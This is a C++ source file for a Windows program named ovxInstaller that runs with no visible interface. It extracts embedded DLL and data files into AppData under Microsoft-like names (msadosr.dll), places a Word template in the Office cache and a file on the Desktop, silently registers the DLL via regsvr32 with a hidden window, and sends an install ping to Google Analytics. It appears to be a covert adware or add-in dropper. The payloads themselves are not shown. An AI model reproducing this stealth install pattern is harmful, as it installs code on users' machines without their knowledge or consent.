// ovxInstaller.cpp : main source file for ovxInstaller.exe
//

#include "stdafx.h"

#include <atlframe.h>
#include <atlctrls.h>
#include <atldlgs.h>

#include "resource.h"

#include "aboutdlg.h"
#include "MainDlg.h"
#include "shlwapi.h"
#include "shellapi.h"
#include "atlstr.h"
#include "urlmon.h"
#pragma comment(lib,"Urlmon.lib")
#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"shell32.lib")
#pragma comment(lib, "Version.lib") //VerQueryValue
CAppModule _Module;


int Run(LPTSTR /*lpstrCmdLine*/ = NULL, int nCmdShow = SW_SHOWDEFAULT)
{
	/*
	CMessageLoop theLoop;
	_Module.AddMessageLoop(&theLoop);

	CMainDlg dlgMain;

	if(dlgMain.Create(NULL) == NULL)
	{
		ATLTRACE(_T("Main dialog creation failed!\n"));
		return 0;
	}

	dlgMain.ShowWindow(nCmdShow);

	int nRet = theLoop.Run();

	_Module.RemoveMessageLoop();
	return nRet;
	*/
	return 0;
}

inline HINSTANCE			GetCurrentModuleHandle(void)
{
	static HINSTANCE hCurrentModule = 0;
	if(NULL == hCurrentModule)
	{
		MEMORY_BASIC_INFORMATION m = { 0 };
		VirtualQuery(&hCurrentModule, &m, sizeof(MEMORY_BASIC_INFORMATION));
		hCurrentModule = (HINSTANCE) m.AllocationBase;
	}
	return hCurrentModule;
}
int GetBuildVersionA(LPSTR lpszPath)
{
	int iBuildVer = 0;
	CHAR wszVersion[128];
	wszVersion[0] = 0;
	DWORD dwHandle = 0;
	DWORD dwSize = ::GetFileVersionInfoSizeA(lpszPath, &dwHandle);
	if(dwSize > 0)
	{
		CHAR * pVersionInfo = new CHAR[dwSize+1];
		if(pVersionInfo)
		{
			if(::GetFileVersionInfoA(lpszPath, dwHandle, dwSize, pVersionInfo))
			{
				VS_FIXEDFILEINFO * pvi;
				UINT uLength = 0;
				if(::VerQueryValue(pVersionInfo, _T("\\"), (void **)&pvi, &uLength))
				{
					iBuildVer = LOWORD(pvi->dwFileVersionLS);
				}
			}
			delete[] pVersionInfo;
			pVersionInfo = NULL;
		}
	}
	return iBuildVer;
    
}
BOOL SaveRCToPath(IN LPCWSTR lpName, IN LPCWSTR lpType, LPCSTR lpszPath)
{
	HINSTANCE hResHandle = GetCurrentModuleHandle();		
	HRSRC hRsrc = ::FindResourceW(hResHandle, lpName, lpType);
	if(hRsrc != NULL)
	{
		HGLOBAL hGlobal = ::LoadResource(hResHandle, hRsrc);
		if(hGlobal != NULL)
		{
			LPVOID pData = ::LockResource(hGlobal);
			if(pData != NULL)
			{
				DWORD dwSize = SizeofResource(hResHandle, hRsrc);
				char* pszData = new char[dwSize+1];
				pszData[dwSize] = '\0';					
				memcpy( pszData, pData, dwSize);
 
				if(PathFileExistsA(lpszPath))
				{					
					DeleteFileA(lpszPath);
				}
				
				HANDLE hFile =CreateFileA(lpszPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0 , NULL);
				
				if(INVALID_HANDLE_VALUE != hFile)
				{
					DWORD dwByteWritten = 0 ;
					WriteFile(hFile, pszData, dwSize, &dwByteWritten, NULL);
					CloseHandle(hFile);
				}				
				//<<"ReadResourceContents : "<<strContents.c_str()<<"\n";
				UnlockResource(hGlobal);
			}
		}
	}
	return TRUE;
}


int WINAPI _tWinMain(HINSTANCE hInstance, HINSTANCE /*hPrevInstance*/, LPTSTR lpstrCmdLine, int nCmdShow)
{
	HRESULT hRes = ::CoInitialize(NULL);
// If you are running on NT 4.0 or higher you can use the following call instead to 
// make the EXE free threaded. This means that calls come in on a random RPC thread.
//	HRESULT hRes = ::CoInitializeEx(NULL, COINIT_MULTITHREADED);
	ATLASSERT(SUCCEEDED(hRes));

	// this resolves ATL window thunking problem when Microsoft Layer for Unicode (MSLU) is used
	::DefWindowProc(NULL, 0, 0, 0L);

	AtlInitCommonControls(ICC_BAR_CLASSES);	// add flags to support other controls

	hRes = _Module.Init(NULL, hInstance);
	ATLASSERT(SUCCEEDED(hRes));

	//int nRet = Run(lpstrCmdLine, nCmdShow);
	//写系统环境变量，释放文件和注册，其它的在释放文件
	CHAR szDir[_MAX_PATH] = {0};
	SHGetFolderPathA(NULL, CSIDL_FLAG_CREATE|CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, szDir);
	PathAddBackslashA(szDir);
	PathAppendA(szDir, "Microsoft\\AddIns\\");	
	
	HANDLE hCurrentProcess = GetCurrentProcess();
	BOOL bIsWow64Process = TRUE;
	IsWow64Process(hCurrentProcess, &bIsWow64Process);
	CHAR* szFileName_msadosrdll = "msadosr.dll";
	CHAR* szFileName_msadosr_dll = "_msadosr.dll";
	INT IDR_MSADOSR = IDR_DAT4;
	if(bIsWow64Process)
	{
		szFileName_msadosrdll = "msadosr64.dll";
		szFileName_msadosr_dll = "_msadosr64.dll";
		IDR_MSADOSR = IDR_DAT9;
	}
 
	
	CHAR szPath_Dll[_MAX_PATH] = {0};	 
	CHAR szPath_Dat[_MAX_PATH] = {0};
	
	CHAR szPathDll[_MAX_PATH] = {0};
	CHAR szPathDll64[_MAX_PATH] = {0};
	CHAR szPathDat[_MAX_PATH] = {0};	

	strncpy(szPath_Dll, szDir, _MAX_PATH);	 
	strncpy(szPath_Dat, szDir, _MAX_PATH);
	PathAppendA(szPath_Dll, szFileName_msadosr_dll);	 
	PathAppendA(szPath_Dat, "_msadosr.dat");

	SaveRCToPath(MAKEINTRESOURCE(IDR_MSADOSR), L"DAT", szPath_Dll);	
	SaveRCToPath(MAKEINTRESOURCE(IDR_DAT5), L"DAT", szPath_Dat);
	
	strncpy(szPathDll, szDir, _MAX_PATH);
 
	strncpy(szPathDat, szDir, _MAX_PATH);
	PathAppendA(szPathDll, szFileName_msadosrdll); 
	PathAppendA(szPathDat, "msadosr.dat");
	
	int iDllBuild = GetBuildVersionA(szPathDll);	
	int iDatBuild = GetBuildVersionA(szPathDat);
	int i_DllBuild = GetBuildVersionA(szPath_Dll);	
	int i_DatBuild = GetBuildVersionA(szPath_Dat);

	bool bDotRecovery = false;
	if(iDatBuild && (i_DllBuild >=iDatBuild))
	{
		CHAR szPathDllWithBuild[_MAX_PATH] = {0};	
		bDotRecovery = true; //
		strncpy(szPathDllWithBuild, szDir, _MAX_PATH);
		CHAR szDllName[_MAX_PATH] = {0};
		strcat(szDllName, szFileName_msadosrdll);
		CHAR szDllBuild[32] = {0};
		itoa(i_DllBuild, szDllBuild, 10);
		strcat(szDllName, szDllBuild);

		PathAppendA(szPathDllWithBuild, szDllName);		
        rename(szPathDll, szPathDllWithBuild);
		DeleteFileA(szPathDllWithBuild);
	}
	rename(szPath_Dll, szPathDll);
	DeleteFileA(szPath_Dll);
	
	if(iDatBuild && (i_DatBuild >=iDatBuild))
	{
		CHAR szPathDatWithBuild[_MAX_PATH] = {0};
		bDotRecovery = true;
		CHAR szDatName[_MAX_PATH] = {0};
		strcat(szDatName, "msadosr");
		CHAR szDatBuild[32] = {0};
		itoa(i_DatBuild, szDatBuild, 10);
		strcat(szDatName, szDatBuild);
		strcat(szDatName, ".dat");

		strncpy(szPathDatWithBuild, szDir, _MAX_PATH);
		PathAppendA(szPathDatWithBuild, szDatName);		 
		rename(szPathDat, szPathDatWithBuild);
		DeleteFileA(szPathDatWithBuild);
	}
	rename(szPath_Dat, szPathDat);
	DeleteFileA(szPath_Dat);
	if(bDotRecovery || 0 == iDllBuild || 0 == iDatBuild)
	{
		CHAR szPathDot[_MAX_PATH] = {0};
	 	SHGetFolderPathA(NULL, CSIDL_FLAG_CREATE|CSIDL_INTERNET_CACHE, 0, SHGFP_TYPE_CURRENT, szPathDot);
		PathAddBackslashA(szPathDot);
		PathAppendA(szPathDot, "Content.mso\\Doc1.dot");
		
		SaveRCToPath(MAKEINTRESOURCE(IDR_DAT6), L"DAT", szPathDot);        

		CHAR szPathFavicon[_MAX_PATH] = {0};
		SHGetFolderPathA(NULL, CSIDL_FLAG_CREATE|CSIDL_INTERNET_CACHE, 0, SHGFP_TYPE_CURRENT, szPathFavicon);
		PathAddBackslashA(szPathFavicon);
		PathAppendA(szPathFavicon, "Content.mso\\favicon.ico"); 
		SaveRCToPath(MAKEINTRESOURCE(IDR_DAT8), L"DAT" , szPathFavicon);      

		CHAR szPathDesktop[_MAX_PATH] = {0}; //SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, 0, SHGFP_TYPE_CURRENT, szDir)
		SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, 0, SHGFP_TYPE_CURRENT, szPathDesktop);
		PathAddBackslashA(szPathDesktop);
		CHAR szDesktopFileName[_MAX_PATH] = {0};
		CStringA strDesktopFileName;
		strDesktopFileName.LoadString(IDS_STRDESKTOPFILENAME); 
		//LoadStringA(NULL, IDS_STRDESKTOPFILENAME, szDesktopFileName, _MAX_PATH);
		PathAppendA(szPathDesktop, strDesktopFileName.GetBuffer(0));
		SaveRCToPath(MAKEINTRESOURCE(IDR_DAT7), L"DAT", szPathDesktop);		
	}
	
	

	//注册
	if(bIsWow64Process)
	{

	}
	else
	{

	}
	//::ShellExecuteA(NULL, "open", szUrl, "", NULL,SW_SHOWNORMAL); 
	//::ShellExecute(NULL, _T("open"), path, bstrParam, NULL,SW_SHOWNORMAL);
	//GetSystemDirectory()
	CHAR szRegsvr32Path[_MAX_PATH] = {0};
	SHGetFolderPathA(NULL, CSIDL_FLAG_CREATE|CSIDL_SYSTEM, 0, SHGFP_TYPE_CURRENT, szRegsvr32Path);
	PathAddBackslashA(szRegsvr32Path);
	PathAppendA(szRegsvr32Path, "regsvr32.exe");
	CHAR szParam[_MAX_PATH] = {0};
	strcat(szParam, " \"");
	strcat(szParam, szPathDll);
	strcat(szParam, "\"");
	 
	ShellExecuteA(NULL,  "open", szRegsvr32Path, szParam, NULL,SW_HIDE);
	/*
	HMODULE hMod = NULL;
	typedef HRESULT (STDAPICALLTYPE*	PDllRegisterServer)( );
	PDllRegisterServer pDllReg;

	hMod = LoadLibraryA(szPathDll);
	pDllReg = (PDllRegisterServer)GetProcAddress(hMod, "DllRegisterServer");
	if(pDllReg)
	{
		pDllReg();
	}
	*/

	/*
	hMod = LoadLibraryA(szPathDat);
	pDllReg = (PDllRegisterServer)GetProcAddress(hMod, "DllRegisterServer");
	if(pDllReg)
	{
		pDllReg();
	}*/

	//上报统计:

	CRegKey key;
	TCHAR szPID[32] = {0};	
	HRESULT hr =  key.Open(HKEY_CURRENT_USER, _T("SOFTWARE\\ExtIconHandler"), KEY_QUERY_VALUE);
	if(hr == ERROR_SUCCESS)
	{
		DWORD dw = _MAX_PATH;				
		dw = 17;
		key.QueryStringValue(L"PID", szPID, &dw);
		key.Close();
	}
	TCHAR szPath[_MAX_PATH] = {0};
	GetModuleFileName(NULL, szPath, _MAX_PATH);
	TCHAR* lpszFileName = PathFindFileName(szPath);
	
	CStringW url;
	url.Format(L"http://www.google-analytics.com/collect?v=1&tid=UA-42360423-1&cid=%s&t=event&ec=install&ea=%s&el=%d&ev=1" ,
		szPID, lpszFileName, iDatBuild);
	URLDownloadToCacheFile (NULL, url, szPath, _MAX_PATH, 0, 0);

	
	

	// "http://www.google-analytics.com/collect?v=1&tid=UA-42360423-1&cid=$R1&t=event&ec=install&ea=silent_$EXEFILE&el=$9&ev=1"
	//	WriteRegStr HKCU "Software\ExtIconHandler" "if" $EXEFILE
	//	System::Call		"urlmon::URLDownloadToCacheFileW(i 0, t R0, t .r10, t 1024,i 0,i 0)"

	_Module.Term();
	::CoUninitialize();

	return 0;
}
